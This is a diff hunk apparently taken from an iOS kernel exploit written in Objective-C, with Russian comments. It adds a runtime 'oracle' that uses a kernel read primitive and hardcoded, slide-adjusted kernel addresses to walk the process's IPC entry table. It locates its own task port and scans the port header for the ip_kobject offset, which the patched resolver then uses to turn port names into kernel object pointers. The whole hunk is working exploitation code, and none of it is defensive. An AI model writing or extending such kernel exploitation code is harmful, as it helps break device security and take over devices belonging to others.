@@ -5878,13 +5878,38 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t vtSendRight = 0xfffffff007eef568ULL + kslide;
         uint64_t vtRootUC    = 0xfffffff007eed8f0ULL + kslide;
         uint64_t vtRoot      = 0xfffffff007eed2f8ULL + kslide;
+        // 1.9.146: ip_kobject ОРАКУЛ — оффсет не из статики, а с железа: резолвим
+        // наш task port (selfTask VA валидирован) и сканируем его заголовок за
+        // selfTask. Заодно валидирует весь walk: если selfTask не нашёлся —
+        // сломан слой выше (is_table/SMR/ie_object), а не ip_kobject.
+        static uint32_t kobjOffRt = 0;
+        if (!kobjOffRt) {
+            uint64_t taskVU = kp_untag_ptr(taskVA);
+            uint32_t tp = mach_task_self();
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (tp >> 8);
+            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+            uint64_t pVA = kp_untag_ptr(oRaw);
+            if (kpLooksLikeKernelPointer(pVA)) {
+                for (uint32_t off = 0x8; off + 8 <= 0x90; off += 8) {
+                    if (kp_untag_ptr(early_kread64(pVA + off)) == taskVU) { kobjOffRt = off; break; }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  ip_kobject oracle: task port VA=%#llx selfTask=%#llx → ip_kobject @ +0x%x (статика +0x%x)%@",
+                          (unsigned long long)pVA, (unsigned long long)taskVU,
+                          kobjOffRt, off_ipc_port_ip_kobject,
+                          kobjOffRt ? @"" : @" — НЕ НАЙДЕН, walk сломан выше!"]);
+            } else {
+                kpNote(r, [NSString stringWithFormat:@"  ip_kobject oracle: task port не разрешился (eVA=%#llx oRaw=%#llx) — walk сломан на ie_object/is_table",
+                          (unsigned long long)eVA, (unsigned long long)oRaw]);
+            }
+            if (!kobjOffRt) kobjOffRt = off_ipc_port_ip_kobject;   // fallback на статику
+        }
         uint64_t (^resolveKobj)(uint32_t) = ^uint64_t(uint32_t nm) {
             if (!nm) return (uint64_t)0;
             uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (nm >> 8);
             uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
             uint64_t pVA = kp_untag_ptr(oRaw);
             if (!kpLooksLikeKernelPointer(pVA)) return (uint64_t)0;
-            uint64_t kRaw = early_kread64(pVA + off_ipc_port_ip_kobject);
+            uint64_t kRaw = early_kread64(pVA + kobjOffRt);
             uint64_t kobj = kp_untag_ptr(kRaw);
             return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
         };
